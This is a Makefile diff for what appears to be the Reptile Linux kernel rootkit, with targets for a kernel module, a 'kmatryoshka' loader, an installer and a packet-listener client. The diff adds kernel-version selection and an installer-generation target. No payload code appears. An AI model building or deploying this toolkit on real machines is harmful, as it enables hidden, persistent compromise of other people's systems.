@@ -2,7 +2,12 @@ CC := gcc
 RM = rm -rf
 SHELL := /bin/bash
 PWD := $(shell pwd)
+include $(PWD)/.config
+ifeq ($(KERNEL_VERSION),"")
 KERNEL := /lib/modules/$(shell uname -r)/build
+else
+KERNEL := /lib/modules/$(KERNEL_VERSION)/build
+endif
 CLIENT_DIR ?= $(PWD)/userland
 CONFIG_SCRIPT ?= $(PWD)/scripts/kconfig/config.sh
 CONFIG_FILE ?= $(PWD)/.config
@@ -19,6 +24,7 @@ RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
 INCLUDE ?= -I$(PWD)/kernel/include
 LOADER ?= $(PWD)/kernel/loader/loader.c
 INSTALLER ?= $(PWD)/scripts/installer.sh
+GEN_INSTALLER ?= $(PWD)/scripts/gen_installer.sh
 
 all: $(BUILD_DIR_MAKEFILE) userland_bin $(ENCRYPT) module kmatryoshka reptile
 
@@ -57,6 +63,9 @@ userland_bin:
 
 install:
 	@ $(SHELL) $(INSTALLER)
+
+gen_installer:
+	@ $(SHELL) $(GEN_INSTALLER)
 
 client: $(BUILD_DIR)
 	@ $(MAKE) -C $(CLIENT_DIR) packet listener client
